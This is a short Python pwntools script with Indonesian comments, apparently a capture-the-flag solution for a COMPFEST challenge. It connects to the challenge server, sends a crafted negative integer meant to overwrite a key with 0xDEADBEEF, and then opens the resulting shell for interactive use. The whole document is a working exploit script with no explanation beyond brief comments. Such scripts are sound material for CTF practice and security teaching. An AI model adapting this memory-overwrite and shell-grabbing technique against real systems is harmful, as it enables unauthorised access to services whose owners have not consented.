from pwn import *

# Tentukan alamat dan port dari server remote
remote_address = 'challenges.ctf.compfest.id'
remote_port = 20005

# Nilai yang akan menimpa key menjadi 0xDEADBEEF
payload = '-2401053092612145152'

# Hubungkan ke server remote
io = remote(remote_address, remote_port)

# Kirim payload ke program
io.sendline(payload)

# Berinteraksi dengan shell yang didapatkan
io.interactive()

